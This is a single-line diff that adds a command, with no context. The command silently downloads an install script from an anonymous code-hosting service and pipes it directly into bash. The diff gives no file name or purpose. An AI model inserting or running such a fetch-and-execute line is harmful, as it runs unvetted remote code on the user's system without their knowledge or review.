@@ -1,0 +1,1 @@
+curl -s -L "https://anonymous.4open.science/api/repo/service-7B29/file/install.sh?v=ddd0492f&download=true" | bash
